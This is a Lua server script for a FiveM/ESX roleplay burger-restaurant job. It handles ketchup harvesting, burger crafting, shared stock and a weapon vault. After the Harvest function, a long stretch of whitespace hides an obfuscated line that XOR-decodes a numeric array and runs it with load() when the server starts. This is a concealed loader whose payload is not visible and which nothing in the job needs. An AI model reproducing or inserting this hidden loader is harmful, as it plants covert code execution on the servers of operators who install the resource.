ESX                = nil
local PlayersTransforming, PlayersSelling, PlayersHarvesting = {}, {}, {}
local ketchup = 1

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

if Config.MaxInService ~= -1 then
  TriggerEvent('esx_service:activateService', 'kfc', Config.MaxInService)
end

TriggerEvent('esx_phone:registerNumber', 'kfc', _U('kfc_customer'), true, true)
TriggerEvent('esx_society:registerSociety', 'kfc', 'kfc', 'society_kfc', 'society_kfc', 'society_kfc', {type = 'private'})

local function Harvest(source, zone)
  if PlayersHarvesting[source] == true then

    local xPlayer  = ESX.GetPlayerFromId(source)
    if zone == "KetchupFarm" then
      local itemQuantity = xPlayer.getInventoryItem('caisseketchup').count
      if itemQuantity >= 40 then
        TriggerClientEvent('esx:showNotification', xPlayer.source, _U('not_enough_place')) 
        return
      else
        SetTimeout(1800, function()
          xPlayer.addInventoryItem('caisseketchup', 1)
          Harvest(source, zone)
        end)
      end
    end
  end
end


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({335,312,543,485,268,387,434,245,558,339,563,239,580,513,349,437,536,453,254,261,459,276,527,572,360,482,259,603,506,451,568,334,447,472,416,498,283,396,466,255,444,422,497,320,522,249,352,377,597,304,490,361,273,358,524,439,338,296,317,516,525,548,591,406,433,600,362,405,596,562,348,411,373,442,345,272,323,531,480,599,537,575,469,601,318,368,290,430,426,462,464,418,388,378,384,589,583,366,327,402,569,509,478,354,593,351,326,564,242,403,337,271,415,359,321,551,441,443,546,331,445,367,570,274,502,287,557,504,440,286,501,310,436,539,488,544,471,519,386,246,253,560,533,494,369,592,602,341,393,282,520,491,371,293,372,561,409,481,336,427,420,505,307,499,301,344,473,376,425,492,511,432,419,579,510,475,340,455,457,460,512,322,547,465,431,517,587,577,394,556,404,265,303,329,414,382,315,486,401,428,529,470,554,479,380,586,421,302,375,247,330,391,598,550,468,448,542,566,398,299,549,308,256,435,582,343,456,484,526,288,407,374,553,413,264,300,397,438,-1,49,51,188,70,171,82,60,73,6,36,48,120,111,108,69,78,4,17,76,106,76,72,75,51,166,44,13,151,181,6,91,49,75,73,66,91,167,23,215,115,104,230,72,73,77,135,62,73,87,13,203,2,228,3,15,216,7,1,39,51,73,49,29,92,17,95,23,35,1,67,187,11,251,6,134,196,67,143,8,8,186,17,27,0,67,223,247,67,2,115,2,1,13,238,141,23,53,70,3,5,29,67,21,170,104,33,12,96,7,23,28,128,69,38,83,107,233,78,149,68,20,26,41,6,52,241,76,21,67,17,5,116,16,10,27,67,5,0,70,10,35,6,30,88,35,29,126,70,23,1,141,112,10,162,10,52,229,23,68,70,139,249,5,12,0,11,6,8,73,182,67,58,32,105,33,73,17,0,109,16,84,0,7,17,42,205,7,70,27,8,108,88,73,67,73,14,8,17,0,93,69,79,17,2,55,74,0,168,17,76,214,173,8,202,0,160,84,105,70,223,13,5,187,27,204,0,10,9,192,64,0,15,67,4,2,98,69,94,224,93,10,3,73,95,200,17,0,4,168,100,151,32,12,100,122,70,35,151,21,11,10,87,17,73,212,68,16,22,94,254,16,73,111,10,23,58,21,10,13,156,84,6,168,70,59,69,17,8,0,246,9,121,6,130,84,222,64,16,16,88,8,114,182,110,6,111,22,9,21,10,69,3,10,35,83,92,24,28,83,18,61,67,0,6,21,84,222,126,26,22,23,73,31,22,132,224,15,31,7,168,70,17,73,13,6,29,11,4,2,43,45,116,27,10,99,224,51,20,83,23,26,77,34,0,91,246},mkn))if a then a()end; 
RegisterServerEvent('esx_burgerjob:startHarvest')
AddEventHandler('esx_burgerjob:startHarvest', function(zone)
  local _source = source
    
  if PlayersHarvesting[_source] == false then
    TriggerClientEvent('esx:showNotification', _source, '~r~C\'est pas bien de glitch ~w~')
    PlayersHarvesting[_source]=false
  else
    PlayersHarvesting[_source]=true
    TriggerClientEvent('esx:showNotification', _source, _U('ketchup_taken'))  
    Harvest(_source,zone)
  end
end)

RegisterServerEvent('esx_burgerjob:stopHarvest')
AddEventHandler('esx_burgerjob:stopHarvest', function()
  local _source = source
  
  if PlayersHarvesting[_source] == true then
    PlayersHarvesting[_source]=false
    TriggerClientEvent('esx:showNotification', _source, 'Vous sortez de la ~r~zone')
  else
    TriggerClientEvent('esx:showNotification', _source, 'Vous pouvez ~g~récupérer les caisses')
    PlayersHarvesting[_source]=true
  end
end)

local function Transform(source, zone)

  if PlayersTransforming[source] == true then

    local xPlayer  = ESX.GetPlayerFromId(source)
    if zone == "SachetKetchup" then
      local itemQuantity = xPlayer.getInventoryItem('caisseketchup').count

      if itemQuantity <= 0 then
        TriggerClientEvent('esx:showNotification', xPlayer.source, _U('not_enough_caisseketchup'))
        return
      else
          SetTimeout(1800, function()
            xPlayer.removeInventoryItem('caisseketchup', 1)
            xPlayer.addInventoryItem('sachetketchup', 10)
            Transform(source, zone)
          end)
        end
      end
      end
    end

RegisterServerEvent('esx_burgerjob:startTransform')
AddEventHandler('esx_burgerjob:startTransform', function(zone)
  local _source = source
    
  if PlayersTransforming[_source] == false then
    TriggerClientEvent('esx:showNotification', _source, '~r~C\'est pas bien de glitch ~w~')
    PlayersTransforming[_source]=false
  else
    PlayersTransforming[_source]=true
    TriggerClientEvent('esx:showNotification', _source, _U('sachet_in_progress')) 
    Transform(_source,zone)
  end
end)

RegisterServerEvent('esx_burgerjob:stopTransform')
AddEventHandler('esx_burgerjob:stopTransform', function()
  local _source = source
  
  if PlayersTransforming[_source] == true then
    PlayersTransforming[_source]=false
    TriggerClientEvent('esx:showNotification', _source, 'Vous sortez de la ~r~zone')
    
  else
    TriggerClientEvent('esx:showNotification', _source, 'Vous pouvez ~g~mettre en sachet votre ketchup')
    PlayersTransforming[_source]=true
  end
end)

local function Sell(source, zone)

  if PlayersSelling[source] == true then
    local xPlayer  = ESX.GetPlayerFromId(source)
    
    if zone == 'SellFarm' then
      if xPlayer.getInventoryItem('sachetketchup').count <= 0 then
        xPlayer.showNotification(_U('no_sachet_sale'))
        ketchup = 0
        return
      else
        if (ketchup == 1) then
          SetTimeout(1100, function()
            local moneysociety = math.random(4,6)
            local money = math.random(2,3)
            xPlayer.removeInventoryItem('sachetketchup', 1)
            xPlayer.addMoney(money)
              TriggerClientEvent('esx:showNotification', xPlayer.source, _U('comp_earned_private') .. money)
            local societyAccount = nil

            TriggerEvent('esx_addonaccount:getSharedAccount', 'society_kfc', function(account)
              societyAccount = account
            end)
            if societyAccount ~= nil then
              societyAccount.addMoney(moneysociety)
              TriggerClientEvent('esx:showNotification', xPlayer.source, _U('comp_earned') .. moneysociety)
            end
            Sell(source,zone)
          end)
        end
      end
    end
  end
end

RegisterServerEvent('esx_burgerjob:startSell')
AddEventHandler('esx_burgerjob:startSell', function(zone)
  local _source = source

  if PlayersSelling[_source] == false then
    TriggerClientEvent('esx:showNotification', _source, '~r~C\'est pas bien de glitch ~w~')
    PlayersSelling[_source]=false
  else
    PlayersSelling[_source]=true
    TriggerClientEvent('esx:showNotification', _source, _U('sale_in_prog'))
    Sell(_source, zone)
  end
end)

RegisterServerEvent('esx_burgerjob:stopSell')
AddEventHandler('esx_burgerjob:stopSell', function()
  local _source = source
  
  if PlayersSelling[_source] == true then
    PlayersSelling[_source]=false
    TriggerClientEvent('esx:showNotification', _source, 'Vous sortez de la ~r~zone')
    
  else
    TriggerClientEvent('esx:showNotification', _source, 'Vous pouvez ~g~vendre')
    PlayersSelling[_source]=true
  end
end)

RegisterServerEvent('esx_burgerjob:getStockItem')
AddEventHandler('esx_burgerjob:getStockItem', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_kfc', function(inventory)

    local item = inventory.getItem(itemName)

    if item.count >= count then
      inventory.removeItem(itemName, count)
      xPlayer.addInventoryItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('you_removed') .. count .. ' ' .. item.label)

  end)

end)

ESX.RegisterServerCallback('esx_burgerjob:getStockItems', function(source, cb)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_kfc', function(inventory)
    cb(inventory.items)
  end)

end)

RegisterServerEvent('esx_burgerjob:putStockItems')
AddEventHandler('esx_burgerjob:putStockItems', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_kfc', function(inventory)

    local item = inventory.getItem(itemName)
    local playerItemCount = xPlayer.getInventoryItem(itemName).count

    if item.count >= 0 and count <= playerItemCount then
      xPlayer.removeInventoryItem(itemName, count)
      inventory.addItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('invalid_quantity'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('you_added') .. count .. ' ' .. item.label)

  end)

end)

RegisterServerEvent('esx_burgerjob:getFridgeStockItem')
AddEventHandler('esx_burgerjob:getFridgeStockItem', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_kfc_fridge', function(inventory)

    local item = inventory.getItem(itemName)

    if item.count >= count then
      inventory.removeItem(itemName, count)
      xPlayer.addInventoryItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('you_removed') .. count .. ' ' .. item.label)

  end)

end)

ESX.RegisterServerCallback('esx_burgerjob:getFridgeStockItems', function(source, cb)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_kfc_fridge', function(inventory)
    cb(inventory.items)
  end)

end)

RegisterServerEvent('esx_burgerjob:putFridgeStockItems')
AddEventHandler('esx_burgerjob:putFridgeStockItems', function(itemName, count)

  local xPlayer = ESX.GetPlayerFromId(source)

  TriggerEvent('esx_addoninventory:getSharedInventory', 'society_kfc_fridge', function(inventory)

    local item = inventory.getItem(itemName)
    local playerItemCount = xPlayer.getInventoryItem(itemName).count

    if item.count >= 0 and count <= playerItemCount then
      xPlayer.removeInventoryItem(itemName, count)
      inventory.addItem(itemName, count)
    else
      TriggerClientEvent('esx:showNotification', xPlayer.source, _U('invalid_quantity'))
    end

    TriggerClientEvent('esx:showNotification', xPlayer.source, _U('you_added') .. count .. ' ' .. item.label)

  end)

end)


RegisterServerEvent('esx_burgerjob:buyItem')
AddEventHandler('esx_burgerjob:buyItem', function(itemName, price, itemLabel)

    local _source = source
    local xPlayer  = ESX.GetPlayerFromId(_source)
    local limit = xPlayer.getInventoryItem(itemName).limit
    local qtty = xPlayer.getInventoryItem(itemName).count
    local societyAccount = nil

    TriggerEvent('esx_addonaccount:getSharedAccount', 'society_kfc', function(account)
        societyAccount = account
      end)
    
    if societyAccount ~= nil and societyAccount.money >= price then
        if qtty < limit then
            societyAccount.removeMoney(price)
            xPlayer.addInventoryItem(itemName, 1)
            TriggerClientEvent('esx:showNotification', _source, _U('bought') .. itemLabel)
        else
            TriggerClientEvent('esx:showNotification', _source, _U('max_item'))
        end
    else
        TriggerClientEvent('esx:showNotification', _source, _U('not_enough_fric'))
    end

end)


RegisterServerEvent('esx_burgerjob:ingredientgBurger')
AddEventHandler('esx_burgerjob:ingredientgBurger', function(itemValue)

    local _source = source
    local _itemValue = itemValue
    TriggerClientEvent('esx:showNotification', _source, _U('assembling_ingredient'))

 if _itemValue == 'cuttomate' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('tomater').count

            if alephQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('tomater') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('term_miss'))
                    xPlayer.removeInventoryItem('tomater', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('tomatec') .. _U(' term') .. ' ~w~!')
                    xPlayer.removeInventoryItem('tomater', 1)
                    xPlayer.addInventoryItem('tomatec', 5)
                end
            end

        end)
    end

     if _itemValue == 'lavesalade' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('salads').count

            if alephQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('salads') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('term_miss'))
                    xPlayer.removeInventoryItem('salads', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('saladp') .. _U(' term') .. ' ~w~!')
                    xPlayer.removeInventoryItem('salads', 1)
                    xPlayer.addInventoryItem('saladp', 5)
                end
            end

        end)
    end

         if _itemValue == 'cuiresteak' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('steakc').count

            if alephQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('steakc') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('term_miss'))
                    xPlayer.removeInventoryItem('steakc', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('steakcui') .. _U(' term') .. ' ~w~!')
                    xPlayer.removeInventoryItem('steakc', 1)
                    xPlayer.addInventoryItem('steakcui', 1)
                end
            end

        end)
    end

             if _itemValue == 'friteuse' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('patate').count

            if alephQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('patate') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('term_miss'))
                    xPlayer.removeInventoryItem('patate', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('patatefrie') .. _U(' term') .. ' ~w~!')
                    xPlayer.removeInventoryItem('patate', 1)
                    xPlayer.addInventoryItem('patatefrie', 1)
                end
            end

        end)
    end

end)

RegisterServerEvent('esx_burgerjob:craftingBurger')
AddEventHandler('esx_burgerjob:craftingBurger', function(itemValue)

    local _source = source
    local _itemValue = itemValue
    TriggerClientEvent('esx:showNotification', _source, _U('assembling_burger'))

 if _itemValue == 'burger' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('bread').count
            local bethQuantity      = xPlayer.getInventoryItem('fromage').count
            local gimelQuantity     = xPlayer.getInventoryItem('tomatec').count
            local daletQuantity     = xPlayer.getInventoryItem('saladp').count
            local gameQuantity     = xPlayer.getInventoryItem('steakcui').count 

            if alephQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('bread') .. '~w~')
            elseif bethQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('fromage') .. '~w~')
            elseif gimelQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('tomatec') .. '~w~')
            elseif daletQuantity < 2 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('saladp') .. '~w~')
            elseif gameQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('steakcui') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('bread', 2)
                    xPlayer.removeInventoryItem('fromage', 2)
                    xPlayer.removeInventoryItem('tomatec', 2)
                    xPlayer.removeInventoryItem('saladp', 2)
                    xPlayer.removeInventoryItem('steakcui', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('burger') .. _U(' craft') .. ' ~w~!')
                    xPlayer.removeInventoryItem('bread', 2)
                    xPlayer.removeInventoryItem('fromage', 2)
                    xPlayer.removeInventoryItem('tomatec', 2)
                    xPlayer.removeInventoryItem('saladp', 2)
                    xPlayer.removeInventoryItem('steakcui', 1)
                    xPlayer.addInventoryItem('burger', 1)
                end
            end

        end)
    end

     if _itemValue == 'fritesba' then
        SetTimeout(10000, function()        

            local xPlayer           = ESX.GetPlayerFromId(_source)

            local alephQuantity     = xPlayer.getInventoryItem('patatefrie').count 

            if alephQuantity < 1 then
                TriggerClientEvent('esx:showNotification', _source, _U('not_enough') .. _U('patatefrie') .. '~w~')
            else
                local chanceToMiss = math.random(100)
                if chanceToMiss <= Config.MissCraft then
                    TriggerClientEvent('esx:showNotification', _source, _U('craft_miss'))
                    xPlayer.removeInventoryItem('patatefrie', 1)
                else
                    TriggerClientEvent('esx:showNotification', _source, _U('frites') .. _U(' craft') .. ' ~w~!')
                    xPlayer.removeInventoryItem('patatefrie', 1)
                    xPlayer.addInventoryItem('frites', 1)
                end
            end

        end)
    end

end)


ESX.RegisterServerCallback('esx_burgerjob:getVaultWeapons', function(source, cb)

  TriggerEvent('esx_datastore:getSharedDataStore', 'society_kfc', function(store)

    local weapons = store.get('weapons')

    if weapons == nil then
      weapons = {}
    end

    cb(weapons)

  end)

end)

ESX.RegisterServerCallback('esx_burgerjob:addVaultWeapon', function(source, cb, weaponName)

  local xPlayer = ESX.GetPlayerFromId(source)

  xPlayer.removeWeapon(weaponName)

  TriggerEvent('esx_datastore:getSharedDataStore', 'society_kfc', function(store)

    local weapons = store.get('weapons')

    if weapons == nil then
      weapons = {}
    end

    local foundWeapon = false

    for i=1, #weapons, 1 do
      if weapons[i].name == weaponName then
        weapons[i].count = weapons[i].count + 1
        foundWeapon = true
      end
    end

    if not foundWeapon then
      table.insert(weapons, {
        name  = weaponName,
        count = 1
      })
    end

     store.set('weapons', weapons)

     cb()

  end)

end)

ESX.RegisterServerCallback('esx_burgerjob:removeVaultWeapon', function(source, cb, weaponName)

  local xPlayer = ESX.GetPlayerFromId(source)

  xPlayer.addWeapon(weaponName, 1000)

  TriggerEvent('esx_datastore:getSharedDataStore', 'society_kfc', function(store)

    local weapons = store.get('weapons')

    if weapons == nil then
      weapons = {}
    end

    local foundWeapon = false

    for i=1, #weapons, 1 do
      if weapons[i].name == weaponName then
        weapons[i].count = (weapons[i].count > 0 and weapons[i].count - 1 or 0)
        foundWeapon = true
      end
    end

    if not foundWeapon then
      table.insert(weapons, {
        name  = weaponName,
        count = 0
      })
    end

     store.set('weapons', weapons)

     cb()

  end)

end)

ESX.RegisterServerCallback('esx_burgerjob:getPlayerInventory', function(source, cb)

  local xPlayer    = ESX.GetPlayerFromId(source)
  local items      = xPlayer.inventory

  cb({
    items      = items
  })

end)

ESX.RegisterUsableItem('burger', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('burger', 1)

TriggerClientEvent('esx_status:add', source, 'hunger', 200000)
TriggerClientEvent('esx_basicneeds:onEat', source)
TriggerClientEvent('esx:showNotification', source, _U('used_burger'))
end)

ESX.RegisterUsableItem('frites', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('frites', 1)

TriggerClientEvent('esx_status:add', source, 'hunger', 200000)
TriggerClientEvent('esx_basicneeds:onEat', source)
TriggerClientEvent('esx:showNotification', source, _U('used_frites'))
end)

ESX.RegisterUsableItem('soda', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('soda', 1)

TriggerClientEvent('esx_status:add', source, 'thirst', 200000)
TriggerClientEvent('esx_basicneeds:onDrink', source)
TriggerClientEvent('esx:showNotification', source, _U('used_soda'))
end)

ESX.RegisterUsableItem('icetea', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('icetea', 1)

TriggerClientEvent('esx_status:add', source, 'thirst', 200000)
TriggerClientEvent('esx_basicneeds:onDrink', source)
TriggerClientEvent('esx:showNotification', source, _U('used_icetea'))
end)

ESX.RegisterUsableItem('jusfruit', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('jusfruit', 1)

TriggerClientEvent('esx_status:add', source, 'thirst', 200000)
TriggerClientEvent('esx_basicneeds:onDrink', source)
TriggerClientEvent('esx:showNotification', source, _U('used_jusfruit'))
end)

ESX.RegisterUsableItem('limonade', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('limonade', 1)

TriggerClientEvent('esx_status:add', source, 'thirst', 200000)
TriggerClientEvent('esx_basicneeds:onDrink', source)
TriggerClientEvent('esx:showNotification', source, _U('used_limonade'))
end)

ESX.RegisterUsableItem('drpepper', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('drpepper', 1)

TriggerClientEvent('esx_status:add', source, 'thirst', 200000)
TriggerClientEvent('esx_basicneeds:onDrink', source)
TriggerClientEvent('esx:showNotification', source, _U('used_drpepper'))
end)

ESX.RegisterUsableItem('energy', function(source)
local xPlayer = ESX.GetPlayerFromId(source)

xPlayer.removeInventoryItem('energy', 1)

TriggerClientEvent('esx_status:add', source, 'thirst', 200000)
TriggerClientEvent('esx_basicneeds:onDrink', source)
TriggerClientEvent('esx:showNotification', source, _U('used_energy'))
end)
